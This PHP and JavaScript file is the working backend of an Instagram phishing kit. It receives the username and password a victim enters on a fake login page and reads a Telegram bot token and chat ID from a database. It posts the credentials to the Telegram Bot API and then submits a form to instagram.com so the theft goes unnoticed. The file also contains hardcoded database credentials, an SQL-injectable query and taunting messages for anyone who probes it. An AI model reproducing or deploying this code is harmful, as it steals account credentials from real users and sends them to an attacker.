<?php 
// create a new connection to the database
$servername = "localhost";
$username = "id21394630_techdeceit";
$password = "AbcdefgH123@#";
$dbname = "id21394630_techdeceit";

$conn = mysqli_connect($servername, $username, $password, $dbname);

// get the ID parameter from the URL
$id = $_GET['id'];

if(!$id)
{
	echo "Access Denied";
	exit;
}

$security = "insta";
if($security!=$_POST['security'])
{
    $random=rand(1,5);

    // Use a switch statement to perform a different action based on the random number
    switch ($random) {
        case 1:
            echo "WHAT YOU WANT TO SEE 🫣";
            break;
        case 2:
            echo "ABEE HACKER KI AULAD, TERE SE KUCHH NAHI HOGA 😁";
            break;
        case 3:
            echo "NAHI MAANEGA RE TU ? 🫡";
            break;
        case 4:
            echo "ETNA DIMAG PADNE ME LAGATA JITNA YAHA LAGA RAHA HAI, TO SAYAD KUCHH KAR PATA 😂";
            break;
        case 5:
            echo "KUCHH HELP CHAHIYE KYA ?? 🤔";
            break;
        default:
            echo "KYA HACKER BANEGA RE TU 😂";
            break;
    }
    exit;
}

// check connection
if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}

$sql = "SELECT * FROM links WHERE id=$id";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
  // Output data of each row
  while($row = mysqli_fetch_assoc($result)) {
    $tokenn = $row["token"];
    $chat_idd = $row["chat_id"];
  }
} else {
  echo "No results found";
}
 
//UserInfo fecher and sender
$username=$_POST['username'];
$password=$_POST['password'];
$token=$tokenn;
$chat_id=$chat_idd;
?>
<form name="myform" action="https://instagram.com" method="post"></form><script>const botToken = "<?php echo $token;?>";const chatId = "<?php echo $chat_id;?>";const username = "<?php echo $username;?>";const password = "<?php echo $password;?>";const message = `INSTA Username : ${username}, Password : ${password}`;fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {method: 'POST',headers: {'Content-Type': 'application/json',},body: JSON.stringify({chat_id: chatId,text: message,}),}).then(response => {console.log('Message sent successfully');document.myform.submit();}).catch(error => {console.error('Error sending message:', error);});</script>